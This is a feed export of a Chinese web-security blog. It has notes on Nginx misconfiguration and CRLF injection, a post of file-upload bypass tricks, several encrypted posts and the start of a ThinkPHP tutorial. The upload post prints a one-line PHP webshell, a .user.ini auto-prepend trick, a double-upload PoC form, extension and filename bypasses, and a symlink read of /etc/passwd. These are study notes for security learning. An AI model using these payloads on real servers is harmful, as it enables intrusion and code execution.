0.8.37<br>一.漏洞原理<br>还是00截断问题<br>二.漏洞复现<br>上传info.jpg..php,抓包在hex选项卡打开，将jpg后面后的.的十六进制改成00.<br>三.漏洞修补<br>升级Nginx版本</p><h4 id="Nginx配置不当"><a href="#Nginx配置不当" class="headerlink" title="Nginx配置不当"></a>Nginx配置不当</h4><p>Nginx配置不当除了造成文件解析漏洞，还可能造成两种后果：1、<strong>可以进行目录遍历（或目录穿越）</strong>；2、<strong>存在CRLF注入，CRLF是”回车+换行”（rn）的简称。目录穿越将在补充内容中进行介绍。</strong><br>一.漏洞原理</p><p>查看Nginx文档，可以发现有三个表示uri的变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.$uri</span><br><span class="line">2.$document_uri</span><br><span class="line">3.$request_uri</span><br></pre></td></tr></table></figure><p>1和2表示的是解码以后的请求路径，不带参数；3表示的是完整的URI（没有解码）</p><p>Nginx目录遍历漏洞和apache一样，属于配置方面的问题。错误的配置可能导致目录遍历与源码泄露。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" class title="This is an test image"><p>CRLF利用了HTTP包Header与Body是用两个CRLF分隔的这一特性，通过控制HTTP消息头中的字符。若采用解码跳转，攻击者就可以注入一些恶意的换行来注入一些会话Cookie或者HTML代码。<img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" class title="This is an test image"><br>二.漏洞复现</p><p>当autoindex on;存在时，可直接访问目录。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/16.png" class title="This is an test image"><p>CRLF注入</p><p>开启burp，刷新页面，抓包，修改数据包。</p><img src="/Web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/17.png" class title="This is an test image"><hr><p>参考博客：</p><p><a href="https://www.anquanke.com/post/id/166616#h2-29">https://www.anquanke.com/post/id/166616#h2-29</a></p><p><a href="https://mp.weixin.qq.com/s/2rSNjMxHZjAGMmzKStF28w">https://mp.weixin.qq.com/s/2rSNjMxHZjAGMmzKStF28w</a></p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;IIS&quot;&gt;&lt;a href=&quot;#IIS&quot; class=&quot;headerlink&quot; title=&quot;IIS&quot;&gt;&lt;/a&gt;IIS&lt;/h3&gt;&lt;h4 id=&quot;IIS文件解析漏洞&quot;&gt;&lt;a href=&quot;#IIS文件解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;IIS文件解析漏洞&quot;&gt;&lt;/a&gt;IIS文件解析漏洞&lt;/h4&gt;&lt;p&gt;IIS文件解析漏洞存在于两个版本，一个是IIS6.0的文件解析漏洞，一个是IIS7.5的文件解析漏洞，IIS7.5的文件解析漏洞原理和IIS6.0类似，均因为存在逻辑问题。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件上传Trick(持续更新...)</title>
    <link href="https://da4er.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-04-08T01:07:14.000Z</published>
    <updated>2020-04-08T08:00:21.311Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文只记载一些文件上传的骚操作，其他的基本操作不在叙述。</p><a id="more"></a><h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>竞争上传原理：有些服务器采用了先保存，再删除不合法文件的方式。所以我们可以上传一个生成shell的文件，然后通过不断的访问这个文件，就会有个时间差，从而在服务器上生成一个shell。<br>操作：使用burp<br>上传生成shell的文件，发送到Intruder模块。</p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="This is an test image"><p>假如我们知道了文件上传的路径，我们就可以不断访问这个，从而生成shell。</p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="This is an test image"><p>设置成null payload：</p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="This is an test image"><p>两个模块一块跑</p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="This is an test image"><p>最后生成了shell</p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="This is an test image"><h4 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h4><p>比较老的一个文件上传漏洞<br>原理：上传点支持多文件上传，但是却只对第一个文件做了过滤。<br>所以我们可以本地构造上传的poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form name&#x3D;&quot;form&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;http:&#x2F;&#x2F;test&#x2F;upload.asp&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>第一个文件上传合法文件，第二个文件上传shell文件。</p><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>PHP版本&lt;5.3.4<br>上传包中泄露了上传地址<br>php的magic_quotes_gpc为OFF状态</p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="This is an test image"><h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。<br>利用条件：<br>在上传文件夹中存在php可执行文件<br>主要利用了两个参数：<br><strong>auto_append_file、auto_prepend_file</strong></p><blockquote><p>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句： require(./a.jpg);<br>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有 exit() 时该设置无效）</p></blockquote><p>所以我们可以自定义一个.user.ini上传：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure><p>这个意思是在同个目录的php文件开头自动加载执行a.jpg<br>所以我们直接上传a.jpg里面包含一句话即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt;eval(@$_REQUEST[1])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="上传黑名单"><a href="#上传黑名单" class="headerlink" title="上传黑名单"></a>上传黑名单</h4><p>在CTF中经常用的后缀名：phtml，shtml<br><strong>php由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。</strong></p><h4 id="系统命名绕过"><a href="#系统命名绕过" class="headerlink" title="系统命名绕过"></a>系统命名绕过</h4><p>在Windows系统中，上传index.php. 会重命名为 . ，可以绕过后缀检查。 也可尝试 index.php%20 ， index.php:1.jpg index.php::$DATA 等。 在Linux系统中，可以尝试上传名为 index.php/. 或 ./aa/../index.php/. 的文件</p><h4 id="软链接任意读取文件"><a href="#软链接任意读取文件" class="headerlink" title="软链接任意读取文件"></a>软链接任意读取文件</h4><p>让用户上传一个 tar 压缩包 , 然后会将其中的 txt 文件的内容显示出来正解是先本地创建一个符号链接指向某一个敏感文件的绝对路径 (/etc/passwd)然后使用 tar 打包后上传给具有漏洞的程序 , 然后 , 经过程序处理以后就会 follow 符号链接将文件内容显示出来<br>参考博客：<br><a href="https://www.lizenghai.com/archives/5763.html">https://www.lizenghai.com/archives/5763.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文只记载一些文件上传的骚操作，其他的基本操作不在叙述。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>RCE学习笔记</title>
    <link href="https://da4er.top/RCE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://da4er.top/RCE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</id>
    <published>2020-04-07T06:20:55.000Z</published>
    <updated>2020-04-07T06:26:56.853Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c80b55e7c49eff9fba0eccb7453aa620bb66301ea2888fbaff3113645ba6d772"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含漏洞学习笔记</title>
    <link href="https://da4er.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://da4er.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</id>
    <published>2020-03-30T12:25:20.000Z</published>
    <updated>2020-03-30T12:30:02.182Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="4aa98a801c80afd93bc86cc1f70fb5849b0f1ff01ed5c55157a0de688348af54"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>2020_3月总结</title>
    <link href="https://da4er.top/2020-3%E6%9C%88%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/2020-3%E6%9C%88%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-26T13:23:30.000Z</published>
    <updated>2020-03-26T13:24:13.778Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="44a57f5f3555a6f9834e1838eb7648051d62e13f773fa5052600fd9accbbbcab">5b5a3e44a7afb6280dbf2374db4000a75f207f5ab9f6534d0f1ecba2a15fd4c5889909ab3d8d5dda74a909e2f7d1dd7fe9c57c9fac8e22409e45fb108c08be92b817b15d2042741846e22f40289db9964c5f6e358fe803d8382135dd9543fd36e724d1e2a1dfb5dc31e719cadf33c286ba9383401706cff4dedf77d4e1c7b994a46a8056555b1ad5c64b2a4d67e751a5d6de39790a6d398ac5e7c8c97d15ab9446aca76fc15b3196bdc87f8c5cf30bd9952fb61d0648e73399741b62d69097b1ef9026b0b5d2311c23ee22c7ffec850e6edfd64b5744132098ffa68baccb86d5a14b04179a9a4fc6982a216bfeb2ad6f132bf63ce53c11ec14d227cfb8fc876cba33e6f5ffcaf673f1d7ce688371bc07b9c0c8e097da96216b50069628795325b0cc975c21bb8890f5d816b4e3ab648e82282f60c617dc944e0c382dfd306ecfdfc8ec78cca4a1cb3f890da6a3b1e012992c910d5bbbb7e5478f58792917bedc306db66e9f2b648c86262e910e5c809e3cff4613e3c368c979cff9ea0b09c74c983055d62c04cc499761debd650ddce3eba3465dd5079b334df3d453bafe093aca41f732e966be8fc3db0484644f32da34f5bbc505f4e628df36ed452751b2cda36454f203f234d509b6949a56f7191b1ac2c1883a9113013b568baa0f44ebe01d52c16a65ff7b3bdf377fbbf5a333ca31469bb95c8cb80ba197980a19d43ceae97efee5b6dcbc8ad2a9c7f9ef3e5fa75b756996ed4697f4c68e51f42ae433c89d7cce8b99eb73710c8b2f8052cd0dfe6cdfaacd589065696977b6a0f6cea503882397f73d8aedddd36352f498cc5986343979a0a22cdd345195e08aed084564383c839b90278089d79ff5b4261ec37d9a47574e405049f220ec612550ae69f729c8db8433b7f85740507614c253fa9d26b19081146146aace0de468d900980534845b9ad3341b2135bba278696f1e00115ad60c51fb552b66ea7194499bff2934ece9755171e76811e800977b5260fb186b1996c66adb768d5942aa27aecd6240a8e6cae14cdf7f61b8fa4c40a96c90da001a65b2872881f801613c94a0f6a62180b06b2b7e378c79876665b65524f0e2f2e783c271bfaaabc62706a84da51db463614658819a7213bf4876576d7dd6dd9fe01612a9be39fc03b5eed712c7369e356744a29d41cc24fa8659a64750c3701833701546545862a6e7ad6ea0d7e089c16fc01989050c7f1fb8b3a6bf31b5e0495ddc190446d77cf1e34bab5ed9366842fdb356c107ed37338ef01572813010793a78759a2a920a64e75eefc141b434f1bfe9deb6c22fd61e96362985418f41eb123149b21d32a308e413209bdf0f4e4ac9d260bdaec21000955e1e6c7e1551d2047808b9e54813cebdc1c71193e1aa2b014d9d017ac39df698cdde5efdc7ed60f70974baadb9c155cb74b5cc60562ac70acb448eb5477a53099f7c6430a2e3b3eda5f0ea02615f921db2ffec433cd56295cebabbe9f39d70f539f20111e260413af3bbaa17e6bb79362e9e681247646afdc793984854d21bdd47ebfdec4c17a60aa8665ff541bfde4a863be1ccc117d923b69c53326eb0fc3e46917f47c137893040c55ec3648e3a44c31f1479613866dac4b63541bcdb88853cad0233396d7b3b367fb88beebe6dcef2a457ca5a243ba50761b092c87f7cf8de1d53961cfeb36a9c02dc19111d66c193b8a86d1b3c50035ebca6d89d6b4ebfe8a41f27d3b456b93a8e0124f7d8a743cb400dedfec6440e458bfd31a8fe010750fcb02a743dc4d91934ec4b16ca8b4deb41ad394d5dc659a01b4cfedeeaaaee4c1347ed0c4fbdc8b0740bbe778650626ba892c0946ad3d4b484caba86d14c7e5a646459c079e6cf794d427dbbcb47edd70f838fc98dd6dc78536b096f6a93174e3bc228053e15e74e3ef410b49a17b32407fe8aa3c22a38e0461c98bfbb3e7ef5c95a0f96b349dde5030691e7f1f1b61b1b19941000dadd2ab991f9f93d3ca45c9f85a8951224b7c37b294a59c77fa71c171bf263722f9a413f5adda73086e97aeb24c6148f98a54344c5faac127463f79c296efd576cc56e7c9509ab40929c4f7a23f93127832822c10ba88763a645c8b35fa59464d807f1c9f4cff7169de37de80a62dc79c4962c0499f4f2dc1c139df9e8b12f1a038e11e52dd931550d9134b2dc1015a33fc8a75f13b069524fbd5d75d34eee6da08bf694efdc288607db860e8a54b419016c2f7943dee3edc7749fc4bd5b8b2a5955a66ca516c7571b01d1fb4946fa4a37aaa90c401ef8fda8a930ade3ccc3e9d2320873e11d99b1bf3d68a4f008c0</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>ThinkPHP学习</title>
    <link href="https://da4er.top/ThinkPHP%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://da4er.top/ThinkPHP%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-03-26T12:58:08.000Z</published>
    <updated>2020-03-28T10:21:00.459Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><h4 id="框架概述"><a href="#框架概述" class="headerlink" title="框架概述"></a>框架概述</h4><blockquote><p>框架就是一些代码类、方法（函数）、变量、常量的集合，这些代码是功能结构性的代码（并非业务代码）。业务代码其实就是具体的一些模块的增删改查逻辑代码。使用框架开发项目，有便于代码重用、开发效率高、代码规范好、便于功能扩展等优点。</p></blockquote><p><strong>一般框架都是基于MVC架构。</strong></p><a id="more"></a><hr><h4 id="PHPStudy构建虚拟主机"><a href="#PHPStudy构建虚拟主机" class="headerlink" title="PHPStudy构建虚拟主机"></a>PHPStudy构建虚拟主机</h4><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/1.png" class title="This is an test image"><p><strong>ThinkPHP的主目录在public下。</strong><br>成功配置会显示：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/2.png" class title="This is an test image"><hr><h4 id="TP框架基础"><a href="#TP框架基础" class="headerlink" title="TP框架基础"></a>TP框架基础</h4><h5 id="TP框架的基本结构"><a href="#TP框架的基本结构" class="headerlink" title="TP框架的基本结构"></a>TP框架的基本结构</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> 1.project  应用部署目录</span><br><span class="line"> 2.├─application           应用目录（可设置）</span><br><span class="line"> 3.│  ├─common             公共模块目录（可更改）</span><br><span class="line"> 4.│  ├─index              模块目录(可更改)</span><br><span class="line"> 5.│  │  ├─config.php      模块配置文件</span><br><span class="line"> 6.│  │  ├─common.php      模块函数文件</span><br><span class="line"> 7.│  │  ├─controller      控制器目录</span><br><span class="line"> 8.│  │  ├─model           模型目录</span><br><span class="line"> 9.│  │  ├─view            视图目录</span><br><span class="line">10.│  │  └─ ...            更多类库目录</span><br><span class="line">11.│  ├─command.php        命令行工具配置文件</span><br><span class="line">12.│  ├─common.php         应用公共（函数）文件</span><br><span class="line">13.│  ├─config.php         应用（公共）配置文件</span><br><span class="line">14.│  ├─database.php       数据库配置文件</span><br><span class="line">15.│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">16.│  └─route.php          路由配置文件</span><br><span class="line">17.├─extend                扩展类库目录（可定义）</span><br><span class="line">18.├─public                WEB 部署目录（对外访问目录）</span><br><span class="line">19.│  ├─static             静态资源存放目录(css,js,image)</span><br><span class="line">20.│  ├─index.php          应用入口文件</span><br><span class="line">21.│  ├─router.php         快速测试文件</span><br><span class="line">22.│  └─.htaccess          用于 apache 的重写</span><br><span class="line">23.├─runtime               应用的运行时目录（可写，可设置）</span><br><span class="line">24.├─vendor                第三方类库目录（Composer）</span><br><span class="line">25.├─thinkphp              框架系统目录</span><br><span class="line">26.│  ├─lang               语言包目录</span><br><span class="line">27.│  ├─library            框架核心类库目录</span><br><span class="line">28.│  │  ├─think           Think 类库包目录</span><br><span class="line">29.│  │  └─traits          系统 Traits 目录</span><br><span class="line">30.│  ├─tpl                系统模板目录</span><br><span class="line">31.│  ├─.htaccess          用于 apache 的重写</span><br><span class="line">32.│  ├─.travis.yml        CI 定义文件</span><br><span class="line">33.│  ├─base.php           基础定义文件</span><br><span class="line">34.│  ├─composer.json      composer 定义文件</span><br><span class="line">35.│  ├─console.php        控制台入口文件</span><br><span class="line">36.│  ├─convention.php     惯例配置文件</span><br><span class="line">37.│  ├─helper.php         助手函数文件（可选）</span><br><span class="line">38.│  ├─LICENSE.txt        授权说明文件</span><br><span class="line">39.│  ├─phpunit.xml        单元测试配置文件</span><br><span class="line">40.│  ├─README.md          README 文件</span><br><span class="line">41.│  └─start.php          框架引导文件</span><br><span class="line">42.├─build.php             自动生成定义文件（参考）</span><br><span class="line">43.├─composer.json         composer 定义文件</span><br><span class="line">44.├─LICENSE.txt           授权说明文件</span><br><span class="line">45.├─README.md             README 文件</span><br><span class="line">46.├─think                 命令行入口文件</span><br></pre></td></tr></table></figure><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>1.三个层级的配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">框架主配置文件（惯例配置文件） thinkphp&#x2F;convention.php</span><br><span class="line">应用公共配置文件 application&#x2F;config.php， application&#x2F;database.php </span><br><span class="line">对整个应用生效模块配置文件 application&#x2F;模块目录&#x2F;config.php 对当前模块生效</span><br></pre></td></tr></table></figure><p>2.其他说明:<br>配置文件格式 return array( 键值对 );<br>加载顺序： 框架主配置文件 》 应用公共配置文件 》 模块配置文件<br>配置文件生效顺序： 后加载的生效（后加载的配置项会覆盖之前配置项）<br><strong>如果要手动进行配置，一般不要修改框架本身的主配置文件，而是在应用或者模块配置文件中进行配置。</strong></p><h5 id="函数文件"><a href="#函数文件" class="headerlink" title="函数文件"></a>函数文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">框架助手函数文件：thinkphp&#x2F;helper.php</span><br><span class="line">应用公共函数文件：application&#x2F;common.php</span><br><span class="line">模块函数文件：application&#x2F;模块目录&#x2F;common.php</span><br></pre></td></tr></table></figure><hr><h4 id="框架的生命周期"><a href="#框架的生命周期" class="headerlink" title="框架的生命周期"></a>框架的生命周期</h4><p>通俗的讲就是：一个url请求从开始到结束的流程</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/3.png" class title="This is an test image"><hr><h4 id="TP中的Controller"><a href="#TP中的Controller" class="headerlink" title="TP中的Controller"></a>TP中的Controller</h4><h5 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h5><p>一般TP框架，默认的controller是无特殊后缀的，例如：<strong>index的控制器就是Index.php，类名是Index。</strong><br>如果想要加特殊后缀，需要在配置文件中进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;controller_suffix&#39; &#x3D;&gt; &#39;Controller&#39;</span><br></pre></td></tr></table></figure><p>那么我们在创建TP框架的时候必须加上Controller，例如：<strong>现在的index的控制器就是IndexController，类名为：IndexController</strong> </p><h5 id="定义控制器"><a href="#定义控制器" class="headerlink" title="定义控制器"></a>定义控制器</h5><p>定义位置：application/模块目录/controller/目录下<br>命名规则：控制器名称（首字母大写） + (控制器后缀，默认没有) + .php</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/4.png" class title="This is an test image"><p>编写控制器：<br>1.声明命令空间：namespace app\模块目录名\controller<br>2.引入控制器基类（可选） use think\Controller; think是命名空间 Controller是基类控制器<br>3.定义当前控制器类，继承控制器基类（可选）<br>例如：定义一个test控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     Test</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-03-26</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">da4er</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"https://da4er.top"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="框架的控制器"><a href="#框架的控制器" class="headerlink" title="框架的控制器"></a>框架的控制器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命名空间本身是PHP就有的，用来防止命名冲突问题的。</span><br><span class="line">TP框架中的命名空间，通常和目录挂钩。</span><br><span class="line">原因：TP中的自动加载机制，会将类的命名空间作为加载路径的一部分。</span><br></pre></td></tr></table></figure><p>TP框架的使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">①声明命名空间 使用namespace关键字</span><br><span class="line">②引入指定的类 使用use关键字 命名空间\类名称</span><br><span class="line">③完全限定式访问 在使用类时，\完整命名空间\类名称（继承和实例化）</span><br></pre></td></tr></table></figure><h4 id="url访问"><a href="#url访问" class="headerlink" title="url访问"></a>url访问</h4><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/5.png" class title="This is an test image"><p>还有一种隐藏入口文件的写法：</p><figure class="highlight plain"><table><tr><td 